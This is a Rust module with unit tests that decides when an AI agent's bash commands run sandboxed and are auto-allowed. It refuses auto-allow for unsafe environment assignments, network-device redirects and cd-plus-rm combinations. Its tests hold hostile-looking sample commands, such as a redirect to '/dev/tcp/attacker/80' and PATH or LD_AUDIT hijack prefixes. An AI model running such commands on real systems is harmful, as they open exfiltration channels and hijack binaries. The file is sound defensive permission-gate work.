//! Sandbox auto-allow decision for the bash permission gate — a faithful,
//! crate-local mirror of the parts of claude-code
//! `src/tools/BashTool/shouldUseSandbox.ts` that `bashToolHasPermission`'s
//! sandbox-auto-allow branch needs (`SandboxManager.isSandboxingEnabled()` +
//! `isAutoAllowBashIfSandboxedEnabled()` + `shouldUseSandbox(input)`).
//!
//! # Why a crate-local mirror (not a `sandbox` dep)
//! The real config + decision live in the `sandbox` crate
//! (`sandbox::runtime_config::SandboxRuntimeConfig` /
//! `sandbox::decision::should_use_sandbox_for_command`). But `sandbox` already
//! depends on `permission` (for `PermissionMode`), so `permission` cannot depend
//! on `sandbox` without a dependency CYCLE — and the parity effort forbids
//! adding a new external/internal edge here. So this module re-implements the
//! SAME decision over a MINIMAL config carrying only the three fields the
//! auto-allow branch reads (`enabled`, `auto_allow_bash_if_sandboxed`,
//! `excluded_commands`). The logic is byte-for-byte the same as
//! `sandbox::decision::should_use_sandbox_for_command` because BOTH call the
//! SAME shared `excludedCommands` core in `crate::shell_command`
//! (`split_command`, `strip_env_and_wrappers_fixedpoint`,
//! `strip_all_leading_env_vars`/`is_binary_hijack_var`, `strip_safe_wrappers`)
//! plus `crate::shell_rule_matching` rule dispatch, so the two cannot drift.
//!
//! # Population
//! [`SandboxAutoAllowConfig`] is attached to a [`crate::policy::PermissionPolicy`]
//! via `with_sandbox_runtime`. When ABSENT (the default), the auto-allow layer
//! is a no-op — behavior is unchanged, preserving the opt-in posture of the
//! whole enforcement path. When present and `enabled`, a command that WOULD be
//! sandboxed ([`SandboxAutoAllowConfig::would_sandbox`]) and that matched no
//! explicit deny/ask rule is auto-allowed (the sandbox is the safety boundary).

/// Minimal sandbox-runtime config the bash auto-allow branch consults — the
/// three fields of `sandbox::runtime_config::SandboxRuntimeConfig` that
/// `bashToolHasPermission`'s sandbox-auto-allow guard reads. Construct one at
/// the engine boot site from the real `SandboxRuntimeConfig` and attach it via
/// [`crate::policy::PermissionPolicy::with_sandbox_runtime`].
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SandboxAutoAllowConfig {
    /// `SandboxRuntimeConfig.enabled` — master sandbox toggle
    /// (`SandboxManager.isSandboxingEnabled()`). When `false`, the auto-allow
    /// branch never fires.
    pub enabled: bool,
    /// `SandboxRuntimeConfig.autoAllowBashIfSandboxed`
    /// (`SandboxManager.isAutoAllowBashIfSandboxedEnabled()`, default `true` in
    /// claude-code). When `false`, a sandboxable command is NOT auto-allowed.
    pub auto_allow_bash_if_sandboxed: bool,
    /// `SandboxRuntimeConfig.excludedCommands` — commands that run OUTSIDE the
    /// sandbox even when enabled (e.g. `bazel`, `make`). A command matching any
    /// of these is NOT sandboxed, so it is NOT auto-allowed.
    pub excluded_commands: Vec<String>,
}

impl SandboxAutoAllowConfig {
    /// Build the minimal config from the three relevant fields. Mirrors copying
    /// them out of a `sandbox::runtime_config::SandboxRuntimeConfig`.
    #[must_use]
    pub fn new(
        enabled: bool,
        auto_allow_bash_if_sandboxed: bool,
        excluded_commands: Vec<String>,
    ) -> Self {
        Self {
            enabled,
            auto_allow_bash_if_sandboxed,
            excluded_commands,
        }
    }

    /// Would `command` be sandbox-wrapped under this config? — 1:1 with
    /// claude-code `shouldUseSandbox` / the `sandbox` crate's
    /// `should_use_sandbox_for_command`: `true` iff `enabled` AND no subcommand
    /// (after compound split + env/wrapper fixed-point stripping) matches any
    /// `excluded_commands` entry. An empty `excluded_commands` ⇒ everything is
    /// sandboxed (returns `true` whenever enabled).
    #[must_use]
    pub fn would_sandbox(&self, command: &str) -> bool {
        if !self.enabled {
            return false;
        }
        if self.excluded_commands.is_empty() {
            return true;
        }
        for subcommand in crate::shell_command::split_command(command) {
            for cand in crate::shell_command::strip_env_and_wrappers_fixedpoint(&subcommand) {
                for pattern in &self.excluded_commands {
                    if crate::shell_command::matches_excluded_pattern(pattern, &cand) {
                        return false;
                    }
                }
            }
        }
        true
    }

    /// The full auto-allow predicate guard: sandboxing enabled AND
    /// auto-allow-if-sandboxed AND the command would be sandboxed AND none of
    /// claude-code's `checkSandboxAutoAllow` (BAu) refusals apply. Mirrors the
    /// `isSandboxingEnabled() && isAutoAllowBashIfSandboxedEnabled() &&
    /// shouldUseSandbox(input)` conjunction at the top of `bashToolHasPermission`,
    /// PLUS the BAu refusal battery (see [`Self::bau_refuses`]) — without which a
    /// sandboxed command carrying an unsafe env assignment, a `/dev/tcp|udp`
    /// network redirect, or a `cd`+`rm` combo would be silently auto-allowed
    /// where CC falls through to the ordinary prompt flow (PERM-SBX-BAU-01).
    #[must_use]
    pub fn auto_allows(&self, command: &str) -> bool {
        self.enabled
            && self.auto_allow_bash_if_sandboxed
            && self.would_sandbox(command)
            && !bau_refuses(command)
    }
}

/// claude-code `checkSandboxAutoAllow` (BAu) refusal battery: even a sandboxable
/// command is NOT auto-allowed (falls through to the prompt) when it contains
/// (1) any env assignment — leading, prefix, or an argv `VAR=`/`VAR+=` token —
/// whose NAME is outside the `Jqr` safe set; (2) any redirect targeting
/// `/dev/tcp/*` or `/dev/udp/*` (opens a network socket); or (3) a `cd`-family
/// command combined with `rm`/`rmdir` in the same compound command (bare-repo /
/// wrong-dir deletion vector). Returns `true` to REFUSE auto-allow.
///
/// (The BAu rm-dangerous-op refusal (#3 in CC) is covered separately by the
/// policy's catastrophic-removal guard, which runs before the sandbox branch.)
/// Reuses the crate's already-CC-faithful primitives — the `Jqr`
/// [`crate::allow_suggestion::SAFE_ENV_ASSIGNMENTS`] set and
/// [`crate::path_constraints::command_has_network_device_redirect`] — so the
/// refusal cannot drift from the corresponding deny/ask paths.
fn bau_refuses(command: &str) -> bool {
    let subs = crate::shell_command::split_command(command);

    // (1) Unsafe env assignment anywhere (name outside the Jqr safe set).
    for sub in &subs {
        for tok in sub.split_whitespace() {
            if let Some(name) = env_assignment_name(tok) {
                if !crate::allow_suggestion::SAFE_ENV_ASSIGNMENTS.contains(&name) {
                    return true;
                }
            }
        }
    }

    // (2) Network-device redirect (`/dev/tcp/`, `/dev/udp/`), output OR input.
    if crate::path_constraints::command_has_network_device_redirect(&subs) {
        return true;
    }

    // (3) cd-family + rm-family co-occurrence across the compound command.
    let (mut has_cd, mut has_rm) = (false, false);
    for sub in &subs {
        match first_word_basename(sub).as_deref() {
            Some("cd" | "pushd" | "popd") => has_cd = true,
            Some("rm" | "rmdir") => has_rm = true,
            _ => {}
        }
    }
    has_cd && has_rm
}

/// If `tok` is an env-assignment token (`NAME=…` or `NAME+=…`, NAME matching
/// `^[A-Za-z_]\w*$`, mirroring `env_assignment_re`), return NAME; else `None`.
fn env_assignment_name(tok: &str) -> Option<&str> {
    let eq = tok.find('=')?;
    let name = tok[..eq].strip_suffix('+').unwrap_or(&tok[..eq]);
    let mut chars = name.chars();
    let first = chars.next()?;
    if !(first.is_ascii_alphabetic() || first == '_') {
        return None;
    }
    if chars.all(|c| c.is_ascii_alphanumeric() || c == '_') {
        Some(name)
    } else {
        None
    }
}

/// First real command word of a subcommand (leading env assignments stripped),
/// reduced to its `/`-basename — the token the cd/rm detection keys on.
fn first_word_basename(sub: &str) -> Option<String> {
    let stripped = crate::shell_command::strip_all_leading_env_vars(sub, None);
    let tok = stripped.split_whitespace().next()?;
    Some(tok.rsplit('/').next().unwrap_or(tok).to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(excluded: &[&str]) -> SandboxAutoAllowConfig {
        SandboxAutoAllowConfig::new(
            true,
            true,
            excluded.iter().map(|s| (*s).to_string()).collect(),
        )
    }

    #[test]
    fn disabled_never_sandboxes() {
        let c = SandboxAutoAllowConfig::new(false, true, vec![]);
        assert!(!c.would_sandbox("echo hi"));
        assert!(!c.auto_allows("echo hi"));
    }

    #[test]
    fn enabled_no_excludes_sandboxes_everything() {
        let c = cfg(&[]);
        assert!(c.would_sandbox("echo hi"));
        assert!(c.would_sandbox("rm -rf /tmp/x"));
        assert!(c.auto_allows("echo hi"));
    }

    // ── BAu refusal battery (PERM-SBX-BAU-01) ────────────────────────────────

    #[test]
    fn bau_refuses_unsafe_env_assignment() {
        let c = cfg(&[]);
        // PATH is not in the Jqr safe set → refuse auto-allow (CC prompts).
        assert!(c.would_sandbox("PATH=/tmp/evil npm test"));
        assert!(!c.auto_allows("PATH=/tmp/evil npm test"));
        // An argv `VAR=` token anywhere also refuses.
        assert!(!c.auto_allows("make FOO=1 all"));
        // A SAFE (Jqr) env assignment still auto-allows.
        assert!(c.auto_allows("RUST_BACKTRACE=1 cargo test"));
    }

    #[test]
    fn bau_refuses_network_device_redirect() {
        let c = cfg(&[]);
        assert!(!c.auto_allows("echo x > /dev/tcp/attacker/80"));
        assert!(!c.auto_allows("cat < /dev/udp/host/53"));
        // A normal file redirect still auto-allows.
        assert!(c.auto_allows("echo x > out.txt"));
    }

    #[test]
    fn bau_refuses_cd_plus_rm_combo() {
        let c = cfg(&[]);
        assert!(!c.auto_allows("cd sub && rm -rf data"));
        assert!(!c.auto_allows("pushd /x && rmdir y"));
        // cd alone or rm alone still auto-allows (the sandbox bounds them; a truly
        // catastrophic rm is caught by the policy's pre-sandbox removal guard).
        assert!(c.auto_allows("cd sub && ls"));
        assert!(c.auto_allows("rm -rf data"));
    }

    #[test]
    fn bau_not_evaluated_when_disabled() {
        let c = SandboxAutoAllowConfig::new(false, true, vec![]);
        assert!(!c.auto_allows("cd sub && rm -rf data"));
    }

    #[test]
    fn excluded_command_is_not_sandboxed() {
        // `make:*` is Prefix (excludes `make all`); a bare `make` Exact would only
        // exclude the literal `make` (strict — no longer first-token), so the
        // arg-bearing form below uses the prefix rule.
        let c = cfg(&["bazel:*", "make:*"]);
        assert!(!c.would_sandbox("bazel build //..."));
        assert!(!c.would_sandbox("make all"));
        assert!(!c.auto_allows("bazel build //..."));
        // a non-excluded command IS sandboxed
        assert!(c.would_sandbox("echo hi"));
        assert!(c.auto_allows("echo hi"));
    }

    #[test]
    fn auto_allow_exact_strict_and_wildcard() {
        // Strict Exact: a bare `bazel` rule no longer excludes `bazel build`
        // (first-token over-match removed), so it WOULD be sandboxed now.
        assert!(cfg(&["bazel"]).would_sandbox("bazel build"));
        // Prefix `bazel:*` still excludes `bazel build` (NOT sandboxed).
        assert!(!cfg(&["bazel:*"]).would_sandbox("bazel build"));
        // Wildcard `make *` (trailing ` *` optional) excludes bare `make`.
        assert!(!cfg(&["make *"]).would_sandbox("make"));
        assert!(!cfg(&["make *"]).would_sandbox("make all"));
    }

    #[test]
    fn exclusion_through_safe_wrapper_and_non_hijack_env() {
        // Faithful claude-code semantics (stripAllLeadingEnvVars with
        // BINARY_HIJACK_VARS blocklist + stripSafeWrappers):
        let c = cfg(&["bazel:*"]);
        // A non-hijack env prefix IS stripped → recognized as excluded → NOT sandboxed.
        assert!(!c.would_sandbox("FOO=bar bazel build"));
        // A SAFE_ENV_VARS prefix is stripped by stripSafeWrappers phase-1 → excluded.
        assert!(!c.would_sandbox("GOOS=linux bazel build"));
        // A safe wrapper is stripped → excluded → NOT sandboxed.
        assert!(!c.would_sandbox("timeout 5 bazel build"));
        assert!(!c.would_sandbox("nohup bazel build"));
        // A binary-hijack env prefix (PATH) makes stripAllLeadingEnvVars BREAK,
        // so `bazel build` is never exposed → still SANDBOXED.
        assert!(c.would_sandbox("PATH=/evil bazel build"));
        // LD_* matches /^LD_/ → still SANDBOXED.
        assert!(c.would_sandbox("LD_AUDIT=x bazel build"));
        // sudo/env are NOT safe wrappers (not in SAFE_WRAPPER_PATTERNS) → still SANDBOXED.
        assert!(c.would_sandbox("sudo bazel build"));
        assert!(c.would_sandbox("env bazel build"));
    }

    #[test]
    fn compound_with_excluded_subcommand_is_not_sandboxed() {
        // If ANY subcommand is excluded, the whole compound is not sandboxed.
        // (`make:*` Prefix excludes `make all`; a bare `make` Exact would not,
        // now that first-token over-match is removed.)
        let c = cfg(&["make:*"]);
        assert!(!c.would_sandbox("echo ok && make all"));
    }

    #[test]
    fn auto_allow_flag_gates() {
        // enabled but auto-allow OFF → would_sandbox true, but auto_allows false.
        let c = SandboxAutoAllowConfig::new(true, false, vec![]);
        assert!(c.would_sandbox("echo hi"));
        assert!(!c.auto_allows("echo hi"));
    }
}
